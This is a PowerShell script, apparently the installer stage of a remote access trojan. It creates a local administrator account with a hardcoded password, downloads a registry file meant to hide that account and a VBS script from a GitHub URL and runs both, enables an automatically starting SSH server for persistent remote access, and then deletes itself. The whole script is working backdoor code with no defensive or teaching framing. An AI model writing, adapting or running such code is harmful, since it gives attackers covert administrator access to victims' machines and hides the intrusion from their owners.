#builds resources for RAT
# created by petros

#random string for directory
function random_text {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
}

#create Local Admin for RAT
function create_account {
    [CmdletBinding()]
    param (
        [string] $uname,
        [securestring] $pword
    )
    begin {
    }
    process {
        New-LocalUser "$uname" -pword $pword -FullName "$uname" -Description "Temporary Local Admin"
        Write-Verbose "$uname local user created"
        Add-LocalGroupMember -Group "Administrators" -Member "$uname"
        Write-Verbose "$uname added to the local administrator group"
    }
    end {
    }
}

##  variables
$wd = random_text
$path = "$env:temp/$wd"
$initial_dir = Get-Location

# create Admin User
$uname = "PetrosRAT"
$pword = (ConvertTo-SecureString "PetrosRat123" -AsPlainText -Force)
create_account -uname $uname -pword $pword

# go to temp, make working directory
mkdir $path
cd $path

# registry to hide local admin
$reg_file = random_text
Invoke-WebRequest -Uri https://raw.githubusercontent.com/peterpapath/RAT/refs/heads/main/files/admin.reg -OutFile "$reg_file.reg"

# visual basic script to register
$vbs_file = random_text
Invoke-WebRequest -Uri https://raw.githubusercontent.com/peterpapath/RAT/refs/heads/main/files/confirm.vbs -OutFile "$vbs_file.vbs"

# enabling persistent ssh
Add-WindowsCapability -Online -Name OpeSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -name sshd -StartupType 'Automatic'

 

# install the registry
./"$reg_file.reg";./"$vbs_file.vbs"

# self delete
cd $initial_dir
del installer.ps1